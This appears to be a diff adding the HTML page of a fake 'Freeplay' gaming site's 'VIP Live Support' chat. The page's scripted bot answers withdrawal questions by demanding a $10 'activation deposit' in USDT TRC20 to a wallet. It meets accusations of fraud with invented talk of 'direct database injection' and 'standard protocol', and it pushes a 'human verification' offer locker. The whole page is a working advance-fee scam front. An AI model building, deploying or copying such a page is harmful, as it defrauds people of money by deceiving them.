@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Freeplay - Live Support</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: { extend: { colors: { obsidian: '#07080d', cyanGlow: '#00f3ff', goldVip: '#ffd700' } } }
+        }
+    </script>
+    <style>
+        body { background-color: #07080d; color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        .gaming-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: #07080d; overflow: hidden; }
+        .grid-overlay { position: absolute; width: 200%; height: 200%; top: -50%; left: -50%; background-image: linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px); background-size: 50px 50px; animation: gridMove 25s linear infinite; }
+        @keyframes gridMove { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }
+        
+        .glass-panel { background: rgba(5, 42, 51, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(0, 243, 255, 0.3); }
+        .nav-center { background: linear-gradient(135deg, #00f3ff, #0088ff); box-shadow: 0 0 20px rgba(0, 243, 255, 0.5); animation: pulseNav 2s infinite; }
+        @keyframes pulseNav { 0%, 100% { box-shadow: 0 0 15px rgba(0, 243, 255, 0.4); } 50% { box-shadow: 0 0 30px rgba(0, 243, 255, 0.8); } }
+        
+        .msg-bot { background: rgba(0, 243, 255, 0.1); border: 1px solid rgba(0, 243, 255, 0.4); border-radius: 12px 12px 12px 2px; }
+        .msg-user { background: rgba(255, 215, 0, 0.1); border: 1px solid rgba(255, 215, 0, 0.4); border-radius: 12px 12px 2px 12px; }
+    </style>
+</head>
+<body class="flex flex-col">
+    <div class="gaming-bg"><div class="grid-overlay"></div></div>
+
+    <header class="fixed top-0 w-full z-50 glass-panel !border-t-0 !border-x-0 !rounded-none px-4 py-3 flex justify-between items-center bg-obsidian/90">
+        <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-full bg-obsidian border-2 border-cyanGlow flex items-center justify-center text-cyanGlow font-bold shadow-[0_0_10px_rgba(0,243,255,0.5)]">
+                <i class="fas fa-headset"></i>
+            </div>
+            <div>
+                <h1 class="font-bold text-sm">VIP Live Support</h1>
+                <p class="text-[10px] text-green-400">Agent Online</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow pt-20 pb-4 px-4 max-w-2xl mx-auto w-full flex flex-col relative z-10" style="height: calc(100vh - 80px);">
+        <div id="chat-window" class="flex-grow overflow-y-auto mb-4 pr-2 flex flex-col gap-4">
+            <div class="flex items-end gap-2 w-5/6">
+                <div class="msg-bot p-3 text-sm shadow-lg text-gray-200">
+                    Welcome to Official VIP Support. Our ledger systems require activation deposits for full cashouts. How can I assist you?
+                </div>
+            </div>
+        </div>
+
+        <div class="w-full pb-2">
+            <div class="flex gap-2">
+                <input type="text" id="chat-input" class="flex-grow bg-obsidian border border-gray-700 rounded p-3 text-sm text-white focus:border-cyanGlow focus:outline-none" placeholder="Message support..." onkeypress="if(event.key==='Enter')sendMessage()">
+                <button onclick="sendMessage()" class="bg-cyanGlow px-5 rounded text-obsidian font-black shadow-[0_0_10px_#00f3ff]">
+                    <i class="fas fa-paper-plane"></i>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <nav class="fixed bottom-0 w-full z-50 glass-panel !rounded-none border-b-0 border-x-0 px-2 py-2 pb-4 bg-obsidian/95">
+        <div class="flex justify-between items-center max-w-md mx-auto relative">
+            <a href="index.html" class="flex flex-col items-center p-2 text-gray-400 hover:text-white"><i class="fas fa-home text-xl mb-1"></i><span class="text-[10px]">Home</span></a>
+            <a href="index.html#games" class="flex flex-col items-center p-2 text-gray-400 hover:text-white"><i class="fas fa-dice text-xl mb-1"></i><span class="text-[10px]">Games</span></a>
+            <a href="transaction.html" class="relative -top-6 flex flex-col items-center">
+                <div class="w-16 h-16 rounded-full nav-center p-1 flex items-center justify-center">
+                    <img src="https://i.postimg.cc/fTmPXTMB/logo-fp.png" alt="FP" class="w-full h-full rounded-full border-2 border-obsidian bg-obsidian">
+                </div>
+            </a>
+            <a href="chat.html" class="flex flex-col items-center p-2 text-cyanGlow"><i class="fas fa-comment-dots text-xl mb-1"></i><span class="text-[10px]">Live Chat</span></a>
+            <a href="account.html" class="flex flex-col items-center p-2 text-gray-400 hover:text-white"><i class="fas fa-user text-xl mb-1"></i><span class="text-[10px]">Account</span></a>
+        </div>
+    </nav>
+
+    <script>
+        const chatWindow = document.getElementById('chat-window');
+        const inputField = document.getElementById('chat-input');
+        
+        function appendMsg(text, isUser) {
+            const div = document.createElement('div');
+            div.className = isUser ? 'flex items-end w-5/6 self-end justify-end' : 'flex items-end w-5/6';
+            div.innerHTML = `<div class="${isUser?'msg-user':'msg-bot'} p-3 text-sm text-white">${text}</div>`;
+            chatWindow.appendChild(div);
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        function getBotResponse(input) {
+            const text = input.toLowerCase();
+            if(text.match(/(withdraw|cashout|pull out|money)/)) return "To withdraw your injected VIP funds, the blockchain ledger requires a minimum $10 activation deposit via USDT TRC20. Go to the Transaction tab.";
+            if(text.match(/(deposit|pay|wallet)/)) return "Please send your $10 deposit ONLY to the USDT TRC20 address provided in the Transaction tab. It maps to Omni-Gen Digital.";
+            if(text.match(/(fake|scam|lie)/)) return "Our portal utilizes direct database injection for sweepstakes credits. The security deposit is standard protocol to prevent bot abuse.";
+            if(text.match(/(locker|verify|survey)/)) return "The human verification step is mandatory to unlock access. Complete 1 offer to proceed.";
+            return "Please ensure your account is activated via a $10 deposit in the Transaction tab to process any pending actions.";
+        }
+
+        function sendMessage() {
+            const val = inputField.value.trim();
+            if(!val) return;
+            appendMsg(val, true);
+            inputField.value = '';
+            setTimeout(() => { appendMsg(getBotResponse(val), false); }, 1000);
+        }
+    </script>
+</body>
+</html>
+```eof
